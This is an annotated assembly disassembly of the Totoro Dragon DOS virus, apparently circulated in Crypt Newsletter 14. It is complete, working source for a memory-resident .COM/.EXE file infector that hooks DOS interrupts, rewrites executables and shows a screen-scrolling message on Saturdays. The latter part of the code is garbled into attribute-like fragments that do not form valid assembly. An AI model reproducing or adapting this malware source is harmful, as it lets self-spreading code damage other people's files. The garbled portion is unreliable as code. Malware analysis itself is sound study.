﻿

;TOTORO DRAGON disassembly.  Included, for your pleasure, in Crypt
;Newsletter 14.  Profuse thanks to Stormbringer, wherever he is.

;***************************************************************************
;*		 The Totoro Dragon Virus from Taiwan		     *
;***************************************************************************
;*    This virus is a fairly simple resident .EXE/.COM infector.  It goes  *
;*resident by re-executing the infected file and using Int 21, function 31.*
;*When it infects a .COM, it puts itself at the beginning of the file and  *
;*starts the host at an offset of 600h (700h in memory), giving the virus  *
;*an effective length of 1536 bytes, plus an extra 4 bytes for its marker  *
;*at the end ("YTIT").  It infects .EXE files using the "standard" method. *
;*While it does save file attributes, the time and date change when a file *
;*is infected.  The virus activates on Saturdays.  When active, it installs*
;*an Int 08 (Timer click) handler that counts to  0CCCh, then shoves the   *
;*text off the screen and prints the following in the upper left-hand      *
;*corner:								  *
;*									 *
;*			ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·			 *
;*			º    Totoro  Dragon    º			 *
;*			ºHello! I am TOTORO CATº			 *
;*			º Written by Y.T.J.C.T º			 *
;*			º in Ping Tung. TAIWAN º			 *
;*			º Don't Worry,be Happy º			 *
;*			ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½			 *
;*									 *
;*It then restarts the counter and does it again.  Other that this effect, *
;*the virus seems relatively harmless.				     *
;*									 *
;*									 *
;*			Disassembly by Stormbringer		      *
;***************************************************************************
.model tiny
.radix 16
.code
	org     100h

start:
		jmp     short COM_Entry_Point
		nop
;***************************************************************************
;*			      Data Tables				*
;***************************************************************************
File_Size_Off   dw      5
File_Size_Seg   dw      0
TSR_DAT	 dw      4262h
DS_Save	 dw      0F21h
ES_Save	 dw      0F21h
File_Attribs    dw      20h
IP_Save	 dw      0
CS_Save	 dw      0F99
SP_Save	 dw      0
SS_Save	 dw      0
File_Type       db      'C'

Wasted_Space    db      0, 0, 0	 ;?

;********************************************
;		EXE_Header		 ;
;********************************************
	EXE_Sig	 db      'MZ'
	Last_Page_Len   dw      14h
	EXE_Size	dw      5
	Rel_Tbl_Items   dw      0
	Header_Size     dw      20h
	Minalloc	dw      0
	Maxalloc	dw      0ffff
	Init_SS	 dw      1
	Init_SP	 dw      700h
	Checksum	dw      0
	Init_IP	 dw      91h
	Init_CS	 dw      1
	First_Rel       dw      001Eh
	Overlay_Num     dw      0
;********************************************

CS_Store	dw      0
Command	 db      'COMMAND.COM', 0
		db       00h, 80h, 00h
ES_Store_1      dw      0F21h
		dw      5Ch
ES_Store_2      dw      0F21h
		dw      6Ch
ES_Store_3      dw      0F21h
File_Handle     dw      5

Buffer_For_Checks	 db      0
			  db       4Ch,0CDh, 21h

File_Name_Off   dw      469h
File_Name_Seg   dw      0DF5h
		db      0
Mem_Seg	 dw      0F93h
IP_24	   dw      156h
CS_24	   dw      0DF5h

;************************************************************************
;*		     Virus Entry Point #1 (COM)		       *
;************************************************************************
COM_Entry_Point:
		mov     ax,0F1F1h       ;Is the virus in memory?
		int     21h
		mov     cs:CS_Store,0
		mov     cs:[ES_Save],es
		cmp     ax,0F1F1h	  ;AX preserved?
		je      Already_Installed  ;Same? go Already_Installed
		jmp     Install_Virus      ;Not In Mem? go Install_Virus

Already_Installed:		 ;Restore control to host file (COM)
		mov     ax,cs
		mov     es,ax		   ;ES = DS = CS
		mov     ds,ax
		mov     ah,0CBh		 ;Restore Control
		mov     si,700h		 ;Offset of host in file
		mov     di,100h		 ;Original offset of host
		mov     cx,cs:[File_Size_Off]   ;Size of host file

		int     21h	;Call internal routine to restore control
				   ;to host .COM file.

;************************************************************************
;*		     Virus Entry Point #2 (EXE)		       *
;************************************************************************
EXE_Entry_Point:
		mov     ax,cs
		sub     ax,10h
		push    ax
		mov     ax,offset After_Jump
		push    ax
		retf			    ;Jump to After_Jump with
						;original .COM offsets.
After_Jump:
		mov     cs:[ES_Save],es
		mov     cs:[DS_Save],ds
		mov     ax,0F1F1h
		int     21h
		cmp     ax,0F1F1h	       ;Check if installed.
		jne     Get_New_Seg	     ;Nope, Install....

		cli
		mov     ax,cs:[SS_Save]	 ;Yes, restore host regs
		add     ax,10h
		mov     bx,es
		add     ax,bx
		mov     ss,ax
		mov     sp,cs:[SP_Save]
		sti

		mov     ax,cs:[CS_Store]
		mov     bx,es
		add     ax,bx
		add     ax,10h
		mov     word ptr cs:[IP_Save+2],ax
		jmp     dword ptr cs:[IP_Save]	  ;Restore Control to
							;.EXE host.

Get_New_Seg:
		push    es			;For later RETF
		xor     ax,ax
		mov     ds,ax		     ;DS = 0

;****************************************************************************
;*NOTE: From 0:200 to 0:400 there is some "empty" space, as it is the upper *
;*      (unused) part of the interrupt tables. This virus uses the top three*
;*      bytes, i.e. the INT 99 entry, to run a repnz movsb command followed *
;*      by a retf.  This is to copy the virus to a new segment in memory and*
;*      jump to it.							 *
;****************************************************************************

		mov     word ptr ds:[3fdh],0A4F3h ;repnz movsb
		mov     byte ptr ds:[3ffh],0CBh   ;retf

		push    cs
		pop     ds

		mov     si,100h
		mov     di,si		     ;Copy virus to new segment
		mov     cx,600h		   ;and "RETF" to
		mov     ax,offset Install_Virus   ;Install_Virus in new copy
		push    ax
		db      0EAh,0FDh, 03h, 00h, 00h  ;Jump far 0:3FDh

Install_Virus:
		cli			     ;Disable interrupts
		push    cs
		pop     ds
		mov     ah,2Ah
		int     21h		     ;Get Day/Date

		cmp     al,6		    ;Is it Saturday?
		jne     Set_Int_21	      ;Nope, don't activate, just
		mov     ax,3508h		;infect files.
		int     21h		     ;Get Int 08 address

		mov     word ptr cs:[IP_08],bx
		mov     word ptr cs:[CS_08],es
		mov     dx,offset Int_08
		mov     ax,2508h
		int     21h		     ;Set Int 08

Set_Int_21:
		mov     ax,3521h
		int     21h		     ;Get Int 21 address

		mov     word ptr cs:[IP_21],bx
		mov     word ptr cs:[CS_21],es
		mov     dx,offset Int_21
		mov     ax,2521h
		int     21h		     ;Set Int_21

		mov     es,cs:[ES_Save]
		cmp     cs:[TSR_DAT],426Bh      ;Second Execute?
		je      Go_TSR		  ;Yep, go TSR

		mov     bx,1000h		;Nope, set up for second exec.
		mov     ah,4Ah
		int     21h		     ;Change Mem Allocation
						;to 64k.

		mov     es,es:[2ch]	     ;Environment string
		xor     di,di
		xor     al,al
		mov     cx,7FFFh

Find_Filename:				  ;Search Environment for
		repne   scasb		   ;filename of host.
		cmp     es:[di],al
		loopnz  Find_Filename

		add     di,3		    ;Skip drive designator
						;i.e. "C:\" in
						;"C:\Infected.EXE"
		mov     dx,di

		push    es
		pop     ds		      ;DS:DX = host filename
		push    cs
		pop     es

		cli			     ;Clears Ints (so none can
						;disrupt second execution
						;of virus)

		mov     ax,cs:[ES_Save]
		mov     cs:[ES_Store_1],ax
		mov     cs:[ES_Store_2],ax
		mov     cs:[ES_Store_3],ax
		mov     bx,144h
		mov     ax,4B00h		;Re-Execute the file
		pushf
		call    dword ptr cs:[IP_21]    ;Call Int 21 to Execute file.

Go_TSR:
		mov     ah,31h
		mov     dx,71h
		int     21h		     ;Terminate and Stay Resident.

Int_21:
		pushf			   ;Push flags
		cmp     ax,0F1F1h	       ;Is it an Install Check?
		jne     Is_It_Execute	   ;No, Go Is_It_Execute
		mov     ax,0F1F1h	       ;Yes, save value (unneccesary)
		popf
		iret			    ;Return to virus in program.

Is_It_Execute:
		cmp     ax,4B00h		;Is it a Load & Execute call?
		jne     Restore_Host	    ;Nope, continue on.
		call    execute		 ;Infect the file if possible.
		jmp     short Go_Int_21	 ;And go to old Int 21 handler.
		nop
Restore_Host:
		cmp     ah,0CBh		 ;Is it a request to restore
		jne     Go_Int_21	       ;control to host?
		pop     ax ax		   ;Pop flags + Old IP (not kept)
		mov     word ptr cs:[IP_Save],100h
		pop     ax
		mov     word ptr cs:[IP_Save+2],ax
		rep     movsb		   ;Restore Host to orig. Pos.
		popf			    ;Completely remove old Int call
		mov     ax,0
		jmp     dword ptr cs:[IP_Save]  ;Jump to Host:100
Go_Int_21:
		popf			    ; Pop flags

		db      0ea		     ;Jump to Int 21
IP_21	   dw      040ebh
CS_21	   dw      0011


execute:
		push    es ds ax bx cx dx si di
		mov     cs:[File_Name_Seg],ds
		mov     cs:[File_Name_Off],dx
		mov     ax,3524h		;Get Int 24 Address
		int     21h		     ;(Critical Error)

		mov     cs:[IP_24],bx
		mov     cs:[CS_24],es
		push    cs
		pop     ds
		mov     dx,offset Int_24
		mov     ax,2524h
		int     21h		     ;Set Int 24

		mov     ds,cs:[File_Name_Seg]
		mov     si,cs:[File_Name_Off]

Name_Check:
		lodsb
		or      al,al		   ;Is the first byte a zero?
		jnz     Name_Check	      ;Nope, find end of string
		mov     al,[si-2]
		and     al,0DFh
		cmp     al,4Dh		  ;'M'
		je      Is_Com		  ;COM file, jump Is_Com
		cmp     al,45h		  ;'E'
		je      Is_EXE		  ;EXE file, jump Is_EXE
		jmp     Clean_Up		;Neither? Go Clean_Up
Is_Com:
		mov     cs:[File_Type],'C'      ;Save File type for later.
		jmp     short Check_If_Command
		nop
Is_EXE:
		mov     cs:[File_Type],'E'

Check_If_Command:
		sub     si,0Ch
		mov     di,offset Command
		push    cs
		pop     es
		mov     cx,0Bh		  ;Is it Command.COM?
		repe    cmpsb
		jnz     Start_Infect	    ;No, Jump Start_Infect
Got_An_Error:
		jmp     Clean_Up		;Is Command, get otta here.

Start_Infect:
		mov     ds,cs:[File_Name_Seg]
		mov     dx,cs:[File_Name_Off]
		mov     ax,4300h
		int     21h		     ;Get Attribs

		jc      Got_An_Error
		mov     cs:[File_Attribs],cx
		xor     cx,cx
		mov     ax,4301h
		int     21h		     ;Zero Attrib's for read/write

		jc      Got_An_Error
		mov     ax,3D02h
		int     21h		     ;Open Read/Write

		jnc     Check_Infect	;Everything Fine? go Check_Infect
		jmp     Reset_Attribs       ;Couldn't Open, go Reset_Attribs

Check_Infect:
		mov     bx,ax
		mov     cs:[File_Handle],ax
		mov     cx,0FFFFh
		mov     dx,0FFFCh
		mov     ax,4202h
		int     21h		     ;Move to 4 bytes from end

		add     ax,4
		mov     cs:[File_Size_Off],ax
		push    cs
		pop     ds
		mov     dx,offset Buffer_For_Checks
		mov     cx,4
		mov     ah,3Fh
		int     21h
						;Read in Last 4 bytes of file
		push    cs
		pop     es
		mov     cx,4
		mov     si,offset Marker       ;are last 4 bytes 'YTIT'?
		mov     di,offset Buffer_For_Checks       ;
		repe    cmpsb
		jnz     Check_Which_Type   ;Not infected? Go Check_Which_Type
		jmp     Close_File	     ;Infected? Go Close_File

Check_Which_Type:
		cmp     cs:[File_Type],'C'      ;Is it a .COM?
		je      COM_Infect	      ;Yes, go COM_Infect
		jmp     EXE_Infect	      ;No, go EXE_Infect

COM_Infect:
		mov     ah,48h
		mov     bx,1000h
		int     21h		     ;Allocate 64k of memory

		jnc     Load_In_File	    ;No Prob? Go Load_In_File
		jmp     Close_File		  ;Otherwise, go Close_File

Load_In_File:
		mov     cs:[Mem_Seg],ax
		mov     bx,cs:[File_Handle]
		xor     cx,cx
		xor     dx,dx
		mov     ax,4200h
		int     21h		     ;Go to beginning of file

		push    cs
		pop     ds
		mov     es,cs:[Mem_Seg]

		mov     si,100

		mov     di,si
		mov     cx,700h
		rep     movsb
		mov     ds,cs:Mem_Seg
		mov     cx,cs:[File_Size_Off]
		mov     dx,700h
		mov     ah,3Fh		  ;Load entire file to directly
		int     21h		     ;after virus.

		xor     cx,cx
		xor     dx,dx
		mov     ax,4200h
		int     21h		     ;Move to the beginning of file

		mov     dx,100h
		mov     cx,cs:[File_Size_Off]
		add     cx,600h
		mov     ah,40h
		int     21h		     ;Write entire file back to disk

		jc      Go_Release_Mem
		xor     cx,cx
		xor     dx,dx
		mov     ax,4202h
		int     21h		     ;Move to end of file

		mov     cs:[File_Size_Seg],0    ;COM < 64k="" add="" ax,4="" ;add="" 4="" for="" marker="" bytes="" mov="" cs:[file_size_off],ax="" ;save="" file="" size="" push="" cs="" pop="" ds="" mov="" dx,offset="" marker="" mov="" cx,4="" mov="" ah,40h="" int="" 21h="" ;write="" in="" marker="" 'ytit'="" go_release_mem:="" jmp="" release_mem="" jmp="" close_file="" exe_infect:="" xor="" cx,cx="" xor="" dx,dx="" mov="" ax,4200h="" int="" 21h="" ;move="" to="" beginning="" of="" file="" push="" cs="" pop="" ds="" db="" 8dh,16h,1bh,01="" ;lea="" dx,cs:[11bh]="" mov="" cx,1ch="" mov="" ah,3fh="" int="" 21h="" ;read="" in="" .exe="" header="" save_header_nfo:="" cli="" ;clear="" ints="" mov="" ax,cs:[init_cs]="" mov="" cs:[cs_store],ax="" ;save="" old="" cs="" mov="" ax,cs:[init_ip]="" mov="" word="" ptr="" cs:[ip_save],ax="" ;save="" old="" ip="" mov="" ax,cs:[init_ss]="" mov="" cs:[ss_save],ax="" ;save="" old="" ss="" mov="" ax,cs:[init_sp]="" mov="" cs:[sp_save],ax="" ;save="" old="" sp="" sti="" ;restore="" ints="" xor="" ax,ax="" cmp="" cs:[last_page_len],0="" je="" calculate_exe_header="" dec="" cs:[exe_size]="" calculate_exe_header:="" ;long,="" drawn="" out="" way="" ;to="" calculate="" new="" exe="" header="" mov="" cx,200h="" xor="" dx,dx="" mov="" ax,cs:[exe_size]="" mul="" cx="" add="" ax,cs:[last_page_len]="" add="" ax,0fh="" adc="" dx,0="" and="" ax,0fff0h="" mov="" cs:[file_size_off],ax="" mov="" cs:[file_size_seg],dx="" push="" dx="" ax="" dx="" ax="" xor="" dx,dx="" mov="" ax,cs:[header_size]="" mov="" cx,10h="" mul="" cx="" pop="" bx="" cx="" sub="" bx,ax="" sbb="" cx,dx="" xchg="" ax,bx="" xchg="" dx,cx="" mov="" cx,10h="" div="" cx="" mov="" cs:[init_cs],ax="" mov="" cs:[init_ss],ax="" mov="" cs:[init_sp],700h="" mov="" cs:[init_ip],offset="" exe_entry_point-100="" pop="" ax="" dx="" push="" dx="" ax="" add="" ax,604h="" adc="" dx,0="" mov="" cx,200h="" div="" cx="" mov="" cs:last_page_len,dx="" or="" dx,dx="" jz="" rewrite_header="" inc="" ax="" rewrite_header:="" mov="" cs:[exe_size],ax="" xor="" cx,cx="" xor="" dx,dx="" mov="" bx,cs:[file_handle]="" mov="" ax,4200h="" int="" 21h="" ;move="" back="" to="" beginning="" of="" file="" push="" cs="" pop="" ds="" mov="" dx,offset="" exe_sig="" mov="" cx,1ch="" mov="" ah,40h="" int="" 21h="" ;write="" exe="" header="" back="" to="" file="" pop="" dx="" pop="" cx="" jc="" close_file="" mov="" ax,4200h="" int="" 21h="" ;go="" to="" end="" of="" host.="" push="" cs="" pop="" ds="" mov="" dx,100="" mov="" cx,600h="" mov="" ah,40h="" int="" 21h="" ;write="" virus="" jc="" close_file="" xor="" cx,cx="" xor="" dx,dx="" mov="" ax,4202h="" int="" 21h="" ;go="" to="" end="" of="" file.="" mov="" dx,offset="" marker="" mov="" cx,4="" mov="" ah,40h="" int="" 21h="" ;write="" marker="" byte.="" jmp="" short="" close_file="" nop="" release_mem:="" mov="" es,cs:mem_seg="" mov="" ah,49h="" int="" 21h="" ;release="" memory="" close_file:="" mov="" ah,3eh="" mov="" bx,cs:[file_handle]="" int="" 21h="" ;close="" file.="" reset_attribs:="" mov="" ds,cs:file_name_seg="" mov="" dx,cs:file_name_off="" mov="" cx,cs:file_attribs="" mov="" ax,4301h="" int="" 21h="" ;reset="" file="" attributes="" clean_up:="" mov="" ds,cs:[cs_24]="" ;restore="" critical="" error="" mov="" dx,cs:[ip_24]="" mov="" ax,2524h="" int="" 21h="" pop="" di="" si="" dx="" cx="" bx="" ax="" ds="" es="" retn="" int_24:="" ;critical="" error="" handler="" xor="" ax,ax="" iret="" int_08:="" ;timer="" click="" handler="" pushf="" inc="" cs:[activation_counter]="" cmp="" cs:[activation_counter],0ccch="" jne="" go_int_08="" mov="" cs:[activation_counter],0="" ;reset="" counter="" push="" ds="" es="" si="" di="" ax="" bx="" cx="" dx="" call="" get_mode="" call="" scroll_area="" call="" print_message="" pop="" dx="" cx="" bx="" ax="" di="" si="" es="" ds="" go_int_08:="" popf="" ;="" pop="" flags="" db="" 0ea="" ip_08="" dw="" 003ch="" cs_08="" dw="" 0d80h="" screen_width="" dw="" 0="" activation_counter="" dw="" 1e0h="" get_mode:="" mov="" ah,0fh="" int="" 10h="" ;get="" video="" mode="" mov="" bx,0b000h="" ;mode="" 7="" text="" video="" memory="" mov="" es,bx="" cmp="" al,7="" je="" in_mode_7="" mov="" bx,0b800h="" ;regular="" text="" video="" memory="" in_mode_7:="" mov="" es,bx="" mov="" ds,bx="" mov="" cs:[screen_width],4fh="" setup_screen:="" mov="" cx,19h="" mov="" bx,0="" clear_screen:="" push="" cx="" call="" scroll_line="" add="" bx,0a0h="" pop="" cx="" loop="" clear_screen="" dec="" cs:[screen_width]="" jnz="" setup_screen="" retn="" scroll_line:="" ;this="" subroutine="" clears="" the="" mov="" di,bx="" ;screen="" by="" scrolling="" the="" text="" mov="" si,bx="" ;straight="" off="" of="" the="" left="" add="" si,2="" ;side.="" mov="" cx,cs:[screen_width]="" scroll_sideways:="" lodsb="" stosb="" inc="" si="" inc="" di="" loop="" scroll_sideways="" retn="" print_message:="" xor="" bx,bx="" push="" cs="" pop="" ds="" db="" 8dh,36h,18h,06="" ;lea="" si,cs:[totoro_design]="" mov="" ah,0eh="" print_loop:="" lodsb="" int="" 10h="" ;write="" char="" in="" teletype="" mode="" cmp="" byte="" ptr="" [si],24h="" ;is="" it="" a="" '$'?="" jne="" print_loop="" ;nope,="" continue="" writing="" retn="" scroll_area:="" xor="" bx,bx="" ;video="" page="" 0="" mov="" ah,3="" int="" 10h="" ;get="" cursor="" info="" push="" dx="" ;push="" cursor="" location="" (dx)="" mov="" ah,6="" mov="" bh,7="" mov="" al,18h="" xor="" cx,cx="" mov="" dh,18h="" mov="" dl,4fh="" int="" 10h="" ;scroll="" up="" (clear="" screen)="" mov="" ah,2="" pop="" dx="" sub="" dh,2="" xor="" bx,bx="" int="" 10h="" ;reset="" cursor="" xor="" bx,bx="" xor="" dx,dx="" mov="" ah,2="" int="" 10h="" ;set="" cursor="" for="" printing.="" retn="" totoro_design:="" db="" '="" öääääääääääääääääääääää·',0dh,="" 0ah="" db="" '="" º="" totoro="" dragon="" º',0dh,="" 0ah="" db="" '="" ºhello!="" i="" am="" totoro="" catº',0dh,="" 0ah="" db="" '="" º="" written="" by="" y.t.j.c.t="" º',0dh,="" 0ah="" db="" '="" º="" in="" ping="" tung.="" taiwan="" º',0dh,="" 0ah="" db="" '="" º="" don''t="" worry,be="" happy="" º',0dh,="" 0ah="" db="" '="" óääääääääääääääääääääää½$'="" marker="" db="" 'ytit'="" db="" 28="" dup="" (0)="" ;***************************************************************************="" ;*end="" of="" virus.="" the="" bytes="" below="" this="" line="" are="" the="" infected="" program="" and="" the="" *="" ;*="" viruses'="" identification="" bytes.="" *="" ;***************************************************************************="" host_program:="" mov="" ax,4c00="" int="" 21="" infected_mark="" db="" 'ytit'="" end="" start="">